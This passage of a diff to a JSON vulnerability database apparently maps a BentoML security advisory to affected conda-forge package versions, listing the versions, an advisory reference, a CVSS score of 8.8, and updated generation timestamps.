+            "1.4.30",
+            "1.4.31",
+            "1.4.32",
+            "1.4.33",
+            "1.4.34",
+            "1.4.35",
+            "1.4.36",
+            "1.4.37",
+            "1.4.38",
+            "1.4.4",
+            "1.4.5",
+            "1.4.6",
+            "1.4.7",
+            "1.4.8",
+            "1.4.9"
+          ],
+          "ecosystem_specific": {},
+          "database_specific": {
+            "source": "https://github.com/pypa/advisory-database/blob/main/vulns/bentoml/PYSEC-2026-190.yaml"
+          }
+        }
+      ],
+      "references": [
+        {
+          "type": "EVIDENCE",
+          "url": "https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44"
+        }
+      ],
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+          "score_num": 8.8
+        }
+      ],
+      "database_specific": {
+        "conda-forge": {
+          "package": "bentoml",
+          "purl": "pkg:conda/bentoml?channel=conda-forge",
+          "source_purls": [
+            "pkg:pypi/bentoml"
+          ],
+          "affected_versions": [
+            "0.13.1",
+            "1.0.0",
+            "1.1.1",
+            "1.1.10",
+            "1.1.11",
+            "1.2.0",
+            "1.2.1",
+            "1.2.2",
+            "1.2.3",
+            "1.2.4",
+            "1.2.5",
+            "1.2.6",
+            "1.2.7",
+            "1.2.8",
+            "1.2.9",
+            "1.2.11",
+            "1.2.12",
+            "1.2.13",
+            "1.2.14",
+            "1.2.15",
+            "1.2.16",
+            "1.2.17",
+            "1.2.19",
+            "1.2.20",
+            "1.3.18",
+            "1.4.30",
+            "1.4.31",
+            "1.4.32",
+            "1.4.33",
+            "1.4.34",
+            "1.4.35",
+            "1.4.36",
+            "1.4.37",
+            "1.4.38"
+          ],
+          "conda_versions_total": 35,
+          "affects_future": false,
+          "derived_by": "purl-associator/scripts.cve_match",
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       }
     },
@@ -5623,7 +6303,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
